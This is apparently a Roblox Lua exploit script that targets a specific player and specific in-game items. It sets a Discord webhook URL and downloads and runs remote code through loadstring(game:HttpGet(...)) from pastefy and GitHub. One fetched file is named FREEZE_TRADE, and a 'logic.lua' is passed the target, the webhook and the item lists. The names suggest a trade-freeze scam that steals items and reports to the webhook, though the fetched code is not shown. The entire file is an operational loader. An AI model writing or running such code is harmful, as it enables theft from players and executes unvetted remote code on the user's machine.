local TARGET_ID = 2491955
local TARGET_USER = "wsada"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1569023103357689896/QK3Q7Zz2qRu_jVcfrW3OwMkZCE1I-"

local TargetBrainrots = {
    ["Dragon Skeletonini"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true
}

local TargetGears = {
    ["Alien Slap"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)